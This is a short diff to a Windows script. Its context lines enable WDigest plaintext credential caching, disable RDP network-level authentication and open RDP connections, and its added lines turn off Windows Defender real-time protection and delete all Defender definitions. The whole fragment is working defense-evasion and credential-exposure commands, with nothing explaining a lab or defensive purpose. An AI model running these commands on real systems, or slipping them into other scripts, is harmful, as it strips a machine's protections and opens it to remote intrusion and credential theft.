@@ -41,3 +41,9 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v UserAuthentication /d 0 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fDenyTSConnections /d 0 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fSingleSessionPerUser /d 10 /f
+
+#Disable Defender
+Write-Host "Windows Defender Disabled"
+Powershell Set-MpPreference -DisableRealtimeMonitoring $true 
+# Remove definitions
+"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
